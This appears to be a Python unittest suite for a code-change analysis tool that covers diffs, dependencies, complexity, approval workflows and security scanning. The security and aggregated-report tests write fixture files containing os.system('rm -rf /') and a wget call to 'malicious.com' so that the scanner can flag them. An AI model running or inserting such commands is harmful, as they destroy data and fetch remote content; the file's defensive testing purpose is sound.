import unittest
from unittest.mock import Mock, patch
import os
import tempfile
from consolidated_code_analysis import ConsolidatedCodeAnalysis

class TestConsolidatedCodeAnalysis(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.baseline_dir = os.path.join(self.temp_dir, "baseline")
        self.staging_dir = os.path.join(self.temp_dir, "staging")
        
        # Create test directories
        os.makedirs(self.baseline_dir)
        os.makedirs(self.staging_dir)
        
        self.analyzer = ConsolidatedCodeAnalysis(
            baseline_dir=self.baseline_dir,
            staging_dir=self.staging_dir
        )

    def tearDown(self):
        # Clean up test directories
        for path in [self.baseline_dir, self.staging_dir]:
            if os.path.exists(path):
                for file in os.listdir(path):
                    os.remove(os.path.join(path, file))
                os.rmdir(path)
        os.rmdir(self.temp_dir)

    def test_file_diff_analysis(self):
        """Test file difference analysis"""
        # Create test files
        baseline_content = "def test_func():\n    return True"
        staging_content = "def test_func():\n    return False"
        
        baseline_file = os.path.join(self.baseline_dir, "test.py")
        staging_file = os.path.join(self.staging_dir, "test.py")
        
        with open(baseline_file, 'w') as f:
            f.write(baseline_content)
        with open(staging_file, 'w') as f:
            f.write(staging_content)

        diff = self.analyzer.analyze_file_diff("test.py")
        self.assertTrue(diff["has_changes"])
        self.assertIn("return True", diff["removed"])
        self.assertIn("return False", diff["added"])

    def test_dependency_analysis(self):
        """Test dependency analysis"""
        test_content = """
import os
import sys
from datetime import datetime
import custom_module
        """
        test_file = os.path.join(self.staging_dir, "deps_test.py")
        with open(test_file, 'w') as f:
            f.write(test_content)

        deps = self.analyzer.analyze_dependencies(test_file)
        self.assertIn("os", deps["standard_libs"])
        self.assertIn("sys", deps["standard_libs"])
        self.assertIn("datetime", deps["standard_libs"])
        self.assertIn("custom_module", deps["custom_modules"])

    def test_security_analysis(self):
        """Test security analysis of code changes"""
        suspicious_code = """
import os
import subprocess

def dangerous_func():
    os.system('rm -rf /')
    subprocess.call(['wget', 'malicious.com'])
        """
        test_file = os.path.join(self.staging_dir, "security_test.py")
        with open(test_file, 'w') as f:
            f.write(suspicious_code)

        security_report = self.analyzer.analyze_security_risks(test_file)
        self.assertTrue(security_report["has_risks"])
        self.assertGreater(len(security_report["dangerous_calls"]), 0)

    def test_complexity_analysis(self):
        """Test code complexity analysis"""
        complex_code = """
def nested_function(x):
    if x > 0:
        if x < 10:
            for i in range(x):
                while i > 0:
                    if i % 2 == 0:
                        return True
                    i -= 1
    return False
        """
        test_file = os.path.join(self.staging_dir, "complexity_test.py")
        with open(test_file, 'w') as f:
            f.write(complex_code)

        complexity = self.analyzer.analyze_complexity(test_file)
        self.assertGreater(complexity["cyclomatic_complexity"], 1)
        self.assertGreater(complexity["nesting_depth"], 2)

    def test_change_approval(self):
        """Test change approval workflow"""
        test_changes = {
            "file": "test.py",
            "changes": ["function_modification"],
            "risk_level": "low"
        }
        
        # Test approval
        approval_result = self.analyzer.approve_change(test_changes)
        self.assertTrue(approval_result["approved"])
        
        # Test rejection of high-risk changes
        test_changes["risk_level"] = "high"
        approval_result = self.analyzer.approve_change(test_changes)
        self.assertFalse(approval_result["approved"])

    def test_report_generation(self):
        """Test analysis report generation"""
        # Create test files and changes
        test_files = {
            "test1.py": "def func1(): pass",
            "test2.py": "def func2(): return True"
        }
        
        for name, content in test_files.items():
            with open(os.path.join(self.staging_dir, name), 'w') as f:
                f.write(content)

        report = self.analyzer.generate_analysis_report()
        self.assertIn("files_analyzed", report)
        self.assertIn("total_changes", report)
        self.assertIn("risk_assessment", report)

    def test_directory_diff_analysis(self):
        """Test analysis of differences across entire directories"""
        # Create multiple test files in both directories
        files = {
            "module1.py": "def func1(): pass",
            "module2.py": "def func2(): return True",
            "subdir/module3.py": "class TestClass: pass"
        }
        
        for name, content in files.items():
            # Create in baseline
            file_path = os.path.join(self.baseline_dir, name)
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            with open(file_path, 'w') as f:
                f.write(content)
            
            # Create modified version in staging
            staging_path = os.path.join(self.staging_dir, name)
            os.makedirs(os.path.dirname(staging_path), exist_ok=True)
            with open(staging_path, 'w') as f:
                f.write(content + "\n# Modified")

        diff_report = self.analyzer.analyze_directory_diffs()
        self.assertTrue(len(diff_report) > 0)
        self.assertTrue(all(diff["has_changes"] for diff in diff_report.values()))

    def test_aggregated_report(self):
        """Test generation of aggregated analysis report"""
        # Setup test files with various characteristics
        test_files = {
            "safe.py": "def safe_func(): return True",
            "risky.py": "import os\nos.system('rm -rf /')",
            "complex.py": """
def nested():
    for i in range(10):
        if i > 5:
            while i > 0:
                if i % 2:
                    return i
                i -= 1
    return 0
        """
        }
        
        for name, content in test_files.items():
            with open(os.path.join(self.staging_dir, name), 'w') as f:
                f.write(content)

        report = self.analyzer.generate_aggregated_report()
        
        self.assertIn("timestamp", report)
        self.assertIn("diff_report", report)
        self.assertIn("baseline_dependencies", report)
        self.assertIn("staging_dependencies", report)
        
        # Verify report contents
        self.assertTrue(any(dep["has_risks"] for dep in report["staging_dependencies"].values()))
        self.assertTrue(any(comp["cyclomatic_complexity"] > 1 
                           for comp in report["staging_dependencies"].values()))

    def test_incremental_analysis(self):
        """Test incremental analysis of changes"""
        # Initial file
        test_file = os.path.join(self.staging_dir, "incremental.py")
        with open(test_file, 'w') as f:
            f.write("def initial(): pass")
        
        first_analysis = self.analyzer.analyze_file_diff("incremental.py")
        
        # Modify file
        with open(test_file, 'w') as f:
            f.write("def initial():\n    return True")
        
        second_analysis = self.analyzer.analyze_file_diff("incremental.py")
        
        self.assertNotEqual(first_analysis, second_analysis)
        self.assertTrue(second_analysis["has_changes"])

    def test_batch_approval_workflow(self):
        """Test batch approval of multiple changes"""
        changes = [
            {"file": "safe1.py", "risk_level": "low"},
            {"file": "safe2.py", "risk_level": "low"},
            {"file": "risky.py", "risk_level": "high"}
        ]
        
        results = [self.analyzer.approve_change(change) for change in changes]
        
        approved = [r["approved"] for r in results]
        self.assertEqual(approved.count(True), 2)  # Two safe files
        self.assertEqual(approved.count(False), 1)  # One risky file

    def test_historical_analysis(self):
        """Test analysis of historical changes"""
        test_file = os.path.join(self.staging_dir, "history.py")
        
        # Create multiple versions
        versions = [
            "def v1(): pass",
            "def v1():\n    return True",
            "def v1():\n    return False"
        ]
        
        history = []
        for version in versions:
            with open(test_file, 'w') as f:
                f.write(version)
            analysis = self.analyzer.analyze_file_diff("history.py")
            history.append(analysis)
        
        self.assertEqual(len(history), len(versions))
        self.assertTrue(all(h["has_changes"] for h in history[1:]))

if __name__ == '__main__':
    unittest.main()